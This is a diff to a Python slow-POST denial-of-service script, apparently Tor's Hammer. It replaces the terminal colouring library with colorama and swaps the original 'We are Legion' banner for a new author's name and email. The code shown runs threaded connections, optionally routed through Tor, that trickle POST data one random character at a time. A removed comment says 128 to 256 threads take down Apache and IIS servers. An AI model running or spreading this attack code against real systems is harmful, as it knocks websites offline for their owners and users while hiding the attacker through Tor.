@@ -1,12 +1,3 @@
-#!/usr/bin/python
-
-# this assumes you have the socks.py (http://phiral.net/socks.py) 
-# and terminal.py (http://phiral.net/terminal.py) in the
-# same directory and that you have tor running locally 
-# on port 9050. run with 128 to 256 threads to be effective.
-# kills apache 1.X with ~128, apache 2.X / IIS with ~256
-# not effective on nginx
-
 import os
 import re
 import time
@@ -16,16 +7,15 @@ import math
 import getopt
 import socks
 import string
-import terminal
-
+import colorama
+from colorama import Fore, Back, Style
 from threading import Thread
 
+
 global stop_now
-global term
 
 stop_now = False
-term = terminal.TerminalController()
-
+colorama.init()
 useragents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
@@ -75,7 +65,7 @@ class httpPost(Thread):
                 self.running = False
                 break
             p = random.choice(string.letters+string.digits)
-            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
+            print ( Fore.CYAN + "Posting : %s" % p + Style.RESET_ALL )
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
 	
@@ -88,12 +78,12 @@ class httpPost(Thread):
                     if self.tor:     
                         self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
+                    print ( Fore.GREEN + "Connected to host..." + Style.RESET_ALL )
                     break
                 except Exception, e:
                     if e.args[0] == 106 or e.args[0] == 60:
                         break
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
+                    print ( Fore.RED + "Error connecting to host..." + Style.RESET_ALL )
                     time.sleep(1)
                     continue
 	
@@ -102,7 +92,7 @@ class httpPost(Thread):
                     self._send_http_post()
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
+                        print ( Fore.YELLOW + "Thread broken, restarting..." + Style.RESET_ALL )
                         self.socks = socks.socksocket()
                         break
                     time.sleep(0.1)
@@ -149,11 +139,11 @@ def main(argv):
         usage()
         sys.exit(-1)
 
-    print term.DOWN + term.RED + "/*" + term.NORMAL
-    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
-    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
-    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
-    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL
+    print ( Fore.YELLOW + "/*" + Style.RESET_ALL )
+    print ( Fore.YELLOW + " * Target: %s Port: %d" % (target, port) + Style.RESET_ALL )
+    print ( Fore.YELLOW + " * Threads: %d Tor: %s" % (threads, tor) + Style.RESET_ALL )
+    print ( Fore.YELLOW + " * Give 20 seconds without tor or 40 with before checking site" + Style.RESET_ALL )
+    print ( Fore.YELLOW + "*/" + Style.RESET_ALL )
 
     rthreads = []
     for i in range(threads):
@@ -165,19 +155,17 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nShutting down threads...\n"
+            print ("\nShutting down threads...\n")
             for t in rthreads:
                 stop_now = True
                 t.running = False
 
 if __name__ == "__main__":
-    print "\n/*"
-    print " *"+term.RED + " Tor's Hammer "+term.NORMAL
-    print " * Slow POST DoS Testing Tool"
-    print " * entropy [at] phiral.net"
-    print " * Anon-ymized via Tor"
-    print " * We are Legion."
-    print " */\n"
+    print ( "\n *                              *" )
+    print ( ' *' + Fore.CYAN + "         Arash Hatami " + Style.RESET_ALL + "        *" )
+    print ( " *  Slow POST DoS Testing Tool  " + "*" )
+    print ( " *    hatamiarash7@gmail.com" + "    *" )
+    print ( " *                              *\n" )
 
     main(sys.argv[1:])
 
